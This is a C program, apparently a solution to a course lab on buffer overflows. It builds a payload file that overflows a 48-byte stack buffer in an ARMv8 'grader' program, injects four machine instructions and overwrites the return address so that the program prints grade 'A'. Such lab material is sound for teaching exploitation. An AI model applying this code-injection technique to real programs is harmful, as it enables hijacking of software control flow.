/* 
produces a file named dataA causing the grader program to print 'A' as the grade.
it writes a short name followed by a '\0', pads to overflow the stack,
inserts armv8 machine code to load 'A' into a register, store it into the grade variable,
and branch back to normal flow. overwrites return address to jump to these instructions.
*/

/*
this main function:
- takes no command line arguments
- does not read from stdin
- does not write to stdout or stderr except on error
- writes crafted bytes to 'dataA' to cause the grader to print 'A'
- returns 0 on success, non-zero otherwise
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

int main(void) {
    /* local comments: 
       write "An", then '\0', then pad to fill the 48-byte buffer.
       insert instructions:
       - mov w0, #A
       - adr x1, gradeAddr
       - strb w0, [x1]
       - b backToPrint
       overwrite return address with codeStart
       ensure no newlines (0x0a).
    */

    const char *name = "An"; /* short name to avoid newline chars */
    const unsigned int charA = 65; /* ASCII 'A' */

    /* known addresses from analysis */
    unsigned long gradeAddr = 0x420044;       /* address of the grade variable */
    unsigned long jumpBackAddr = 0x40089c;    /* address to jump back after setting grade */
    unsigned long codeStart = 0x42007c;       /* start address of our injected code */

    /* build instructions */
    unsigned int movInstr = MiniAssembler_mov(0, charA);           /* mov w0, #A */
    unsigned int adrInstr = MiniAssembler_adr(1, gradeAddr, codeStart + 4); /* adr x1, gradeAddr */
    unsigned int strbInstr = MiniAssembler_strb(0, 1);             /* strb w0, [x1] */
    unsigned int bInstr = MiniAssembler_b(jumpBackAddr, codeStart + 12); /* b jumpBackAddr */

    /* open dataA file */
    FILE *fp = fopen("dataA", "wb"); /* use binary mode */
    if (!fp) return 1;

    /* write name and null terminator */
    fwrite(name, 1, 2, fp); /* "An" */
    fputc('\0', fp);         /* null terminator */

    /* pad to reach 48 bytes total buffer size */
    for (int i = 0; i < (48 - 3); i++) { /* 2 chars + 1 null = 3 bytes */
        fputc('\0', fp);
    }

    /* write instructions (16 bytes total) */
    fwrite(&movInstr, sizeof(movInstr), 1, fp);
    fwrite(&adrInstr, sizeof(adrInstr), 1, fp);
    fwrite(&strbInstr, sizeof(strbInstr), 1, fp);
    fwrite(&bInstr, sizeof(bInstr), 1, fp);

    /* overwrite return address with codeStart (8 bytes for 64-bit) */
    unsigned long fakeReturn = codeStart;
    fwrite(&fakeReturn, sizeof(fakeReturn), 1, fp);

    fclose(fp);
    return 0;
}